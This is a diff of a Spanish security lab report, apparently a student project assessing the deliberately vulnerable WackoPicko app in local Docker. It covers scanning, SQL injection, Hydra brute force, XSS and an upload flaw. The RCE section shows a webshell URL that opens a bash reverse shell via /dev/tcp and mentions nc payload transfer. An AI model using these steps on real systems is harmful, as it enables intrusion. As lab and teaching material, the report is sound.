@@ -34,7 +34,7 @@ draft: false
 
 
 
-## 💻 Proyecto Final: Desarrollo Seguro en WackoPicko
+### 💻 Proyecto Final: Desarrollo Seguro en WackoPicko
 
 **Introducción**
 
@@ -81,9 +81,9 @@ sudo docker images -q: lista IDs de todas las imágenes.
 sudo docker volume ls -q: lista IDs de todos los volúmenes.
 
 ```
-## 📄 Informe Técnico – Evaluación de Seguridad en WackoPicko
+### 📄 Informe Técnico – Evaluación de Seguridad en WackoPicko
 
-### 0. Resumen Ejecutivo
+#### 0. Resumen Ejecutivo
 
 Se realizó una **evaluación de seguridad controlada** sobre la aplicación vulnerable **WackoPicko**, desplegada en un entorno **Docker** y analizada desde **Kali Linux**.  
 El objetivo principal fue **identificar debilidades en autenticación, validación de entradas y manejo de archivos**.
@@ -92,7 +92,7 @@ Durante la práctica se explotaron múltiples vectores que evidencian una **supe
 
 ---
 
-### 🔎 Principales Hallazgos
+#### 🔎 Principales Hallazgos
 
 1. 🔴 **Login de usuarios expuesto a fuerza bruta**  
    - El formulario de login devuelve mensajes de error explícitos al introducir credenciales inválidas.  
@@ -112,7 +112,7 @@ Durante la práctica se explotaron múltiples vectores que evidencian una **supe
 
 ---
 
-### ⚠️ Riesgo Principal
+#### ⚠️ Riesgo Principal
 
 La combinación de vulnerabilidades encontradas incrementa la criticidad:
 
@@ -122,7 +122,7 @@ La combinación de vulnerabilidades encontradas incrementa la criticidad:
 
 👉 Estas fallas permiten un **compromiso total del sistema** por parte de un atacante con conocimientos básicos y herramientas disponibles públicamente. Un atacante podría escalar privilegios, robar información sensible, modificar contenidos o pivotar hacia otros sistemas internos.
 
-#### Recomendaciones clave
+##### Recomendaciones clave
 
 - **Autenticación**:    
     - Bloqueo de cuentas tras 3–5 intentos fallidos.        
@@ -144,14 +144,14 @@ La combinación de vulnerabilidades encontradas incrementa la criticidad:
     - Revisar políticas de mínimos privilegios en el servidor.
 
 
-### **Objetivo 1: Identificación de Vulnerabilidades**
+#### **Objetivo 1: Identificación de Vulnerabilidades**
 
 Comando Docker utilizado: 
 sudo docker run -d -p 127.0.0.1:8888:80 adamdoupe/wackopicko
 
 El primer paso es utilizar herramientas semiautomáticas como **Burp Suite**, **Vega** y **Nikto** para escanear la aplicación y obtener un panorama general de sus fallas de seguridad.
 
-#### Enumeracion y Escaneo con Burp Suite / Vega
+##### Enumeracion y Escaneo con Burp Suite / Vega
 
 Se realizó un escaneo automatizado con **Burp Suite / Vega** para identificar de manera masiva las vulnerabilidades presentes en la aplicación.
 
@@ -166,7 +166,7 @@ El resultado del escaneo muestra la cantidad y el tipo de vulnerabilidades encon
 - **Vulnerabilidades de riesgo medio**: 125         
 - **Vulnerabilidades de bajo riesgo**: 23         
 
-#### Escaneo con Nikto
+##### Escaneo con Nikto
 
 Se utilizó **Nikto** para una exploración más detallada, ya que esta herramienta se enfoca en la búsqueda de archivos y configuraciones inseguras.
 
@@ -180,7 +180,7 @@ El análisis de los resultados de Nikto reveló hallazgos críticos:
 3. **Archivos de Configuración Sensibles**: `+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.` Este hallazgo es muy importante, ya que un archivo de respaldo con credenciales de la base de datos está expuesto públicamente.     
 
 
-#### Enumeración de Directorios con Gobuster
+##### Enumeración de Directorios con Gobuster
 
 Antes de la explotación, se utilizó **Gobuster** para enumerar directorios y archivos, lo que ayudó a descubrir rutas ocultas.
 
@@ -194,12 +194,12 @@ Los resultados mostraron la existencia de archivos como `index.php`, `login.php`
 
 
 
-## **Objetivo 2: Explotación de Vulnerabilidades**
+### **Objetivo 2: Explotación de Vulnerabilidades**
 
 Una vez identificadas las posibles fallas, se procedió a la explotación manual de las vulnerabilidades más relevantes.
 
 
-### **Explotación de la Inyección SQL (SQLi)**
+#### **Explotación de la Inyección SQL (SQLi)**
 
 Se realizó la prueba en `http://127.0.0.1:8888/users/login.php`, introduciendo una comilla simple (`'`), generando el siguiente mensaje de error:
 
@@ -210,7 +210,7 @@ Se observa que aunque aparece el error de sintaxis, la verificación de la contr
 Los escaneos automáticos de **Vega** revelaron múltiples puntos de inyección SQL en la aplicación. Aunque el **error de sintaxis** constante sugería que un filtro de seguridad bloqueaba algunos comandos comunes, la vulnerabilidad persiste y se confirma mediante técnicas de **inyección ciega**.
 
 
-#### 1. Formulario de Registro
+##### 1. Formulario de Registro
 
 El campo **`username`** en `/users/register.php` es vulnerable a inyección SQL. Esto permite:
 
@@ -222,7 +222,7 @@ El campo **`username`** en `/users/register.php` es vulnerable a inyección SQL.
     
 
 
-#### 2. Formulario de Inicio de Sesión
+##### 2. Formulario de Inicio de Sesión
 
 El campo **`username`** en `/users/login.php` también es vulnerable, lo que permite:
 
@@ -232,7 +232,7 @@ El campo **`username`** en `/users/login.php` también es vulnerable, lo que per
     
 
 
-#### 3. Panel de Administración
+##### 3. Panel de Administración
 
 Se detectó una vulnerabilidad de inyección SQL en el parámetro **`page`** de `/admin/index.php`. Esto permite:
 
@@ -249,7 +249,7 @@ Ejemplo de creación de usuario con **Vega**:
 
 
 
-#### 4. Ejemplo de Exploit Manual
+##### 4. Ejemplo de Exploit Manual
 
 En `http://localhost:8888/users/login.php` se inyecta el siguiente payload:
 
@@ -272,7 +272,7 @@ Captura del login exitoso:
 [User Login](/assets/images/headers/userlogin.png)
 
 
-#### 5. Fuerza Bruta de Usuarios
+##### 5. Fuerza Bruta de Usuarios
 
 Se utilizó **Burp Suite - Intruder** para realizar fuerza bruta sobre los usuarios existentes. Resultados:
 
@@ -289,7 +289,7 @@ Comparación de acceso al panel:
 [scanner1 Login](/assets/images/headers/scanner1login.png)
 
 
-#### 6. Enumeración de Usuarios
+##### 6. Enumeración de Usuarios
 
 Se realizó enumeración de usuarios mediante:
 
@@ -302,7 +302,7 @@ Fuerza bruta en usuarios obtenidos, logrando comprometer sus credenciales:
 [BruteForce User](/assets/images/headers/userbrute.png)
 
 
-#### **Mitigación y Recomendaciones de SQL Injection**
+##### **Mitigación y Recomendaciones de SQL Injection**
 
 Para corregir esta vulnerabilidad y prevenir futuros ataques, se recomienda:
 
@@ -331,13 +331,13 @@ Para corregir esta vulnerabilidad y prevenir futuros ataques, se recomienda:
 
 
 
-### **Fuerza Bruta con Hydra – Usuarios y Panel Admin**
+#### **Fuerza Bruta con Hydra – Usuarios y Panel Admin**
 
 **Objetivo:**  
 Realizar ataques de fuerza bruta sobre cuentas de usuarios y el panel de administración en `127.0.0.1:8888` usando la herramienta **Hydra** para evaluar la resistencia de la aplicación frente a intentos masivos de acceso no autorizado.
 
 
-#### 1. Fuerza Bruta sobre Usuario `bryce`
+##### 1. Fuerza Bruta sobre Usuario `bryce`
 
 Se utilizó Hydra para comprobar credenciales del usuario _bryce_:
 
@@ -358,7 +358,7 @@ La captura muestra cómo Hydra detecta intentos fallidos según el mensaje de er
 
 
 
-#### 2. Fuerza Bruta sobre Panel Admin `/admin/index.php?page=login`
+##### 2. Fuerza Bruta sobre Panel Admin `/admin/index.php?page=login`
 
 **Problema detectado:**  
 El panel de administración **no muestra un mensaje de error claro** para logins inválidos. En el navegador, los campos se recargan en blanco sin indicar si el usuario o la contraseña son incorrectos.
@@ -391,13 +391,13 @@ Esta captura muestra el proceso de fuerza bruta en consola y cómo Hydra detecta
 
 
 
-#### 3. Resultados combinados
+##### 3. Resultados combinados
 - Se comprobó que los usuarios identificados previamente mediante inyección SQL (`wanda`, `scanner1`, `bryce`, `bob`) podían ser atacados mediante fuerza bruta automatizada.    
 - El panel de administración también es vulnerable a ataques por fuerza bruta debido a la ausencia de mecanismos de bloqueo y mensajes de error genéricos.
     
 
 
-#### 4. Recomendaciones de seguridad frente a fuerza bruta
+##### 4. Recomendaciones de seguridad frente a fuerza bruta
 
 1. **Límites de intentos:**    
     - Permitir un máximo de 5 intentos fallidos consecutivos por usuario.        
@@ -421,7 +421,7 @@ Esta captura muestra el proceso de fuerza bruta en consola y cómo Hydra detecta
 
 
 
-### **Explotación de Cross-Site Scripting (XSS)**
+#### **Explotación de Cross-Site Scripting (XSS)**
 
 Durante la evaluación se identificó una vulnerabilidad de **XSS reflejado** en el campo de búsqueda de la página:
 
@@ -444,7 +444,7 @@ Estas vulnerabilidades podrían permitir la ejecución de scripts maliciosos en 
 
 
 
-#### **Conclusiones y Recomendaciones Generales**
+##### **Conclusiones y Recomendaciones Generales**
 
 El análisis de **WackoPicko** reveló múltiples vulnerabilidades críticas que, en conjunto, podrían permitir un compromiso total del sistema.
 
@@ -480,7 +480,7 @@ El análisis de **WackoPicko** reveló múltiples vulnerabilidades críticas que
 
 
 
-#### Vulnerabilidad de Inclusión de Archivos y Ejecución Remota de Código (**LFI**/**RCE**)
+##### Vulnerabilidad de Inclusión de Archivos y Ejecución Remota de Código (**LFI**/**RCE**)
 
 La vulnerabilidad más crítica encontrada fue la **inclusión de archivos locales (LFI)** en la función de carga de imágenes, que permitió la ejecución de código remoto.
 
@@ -500,7 +500,7 @@ Luego de navegar como el usuario `bob`, se identificó una vulnerabilidad de **i
 
 
 
-##### **1. Detección y Prueba de Concepto**
+###### **1. Detección y Prueba de Concepto**
 
 La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modificado en **Burp Suite**. En lugar de datos de imagen, se inyectó un _webshell_ con el siguiente flujo:
 
@@ -519,7 +519,7 @@ La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modific
     
 
 
-##### **2. Consecuencias**
+###### **2. Consecuencias**
 
 - **Ejecución de comandos arbitrarios** en el servidor.
     
@@ -530,7 +530,7 @@ La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modific
 
 
 
-##### **3. Exploits y Comandos Usados**
+###### **3. Exploits y Comandos Usados**
 
 - Subida de archivos maliciosos vía Burp Suite.    
 - Transferencia de payload con `nc` y ejecución remota.    
@@ -582,7 +582,7 @@ localhost:8888/upload/shell1.php/shell.php?cmd=bash%20-i%20>%26%20/dev/tcp/192.1
 Contenido del arhcivo PHP subido para entablar conexion:
 [Code php Reverse](/assets/images/headers/phpcoderever.png)
 
-##### **4. Recomendaciones y Mitigaciones**
+###### **4. Recomendaciones y Mitigaciones**
 
 - **Validación estricta de archivos:** Comprobar extensión (`.jpg`, `.png`, `.gif`) y _magic bytes_.    
 - **Protección de carpeta de subida:** No permitir ejecución de scripts; renombrar archivos con hashes o nombres aleatorios.    
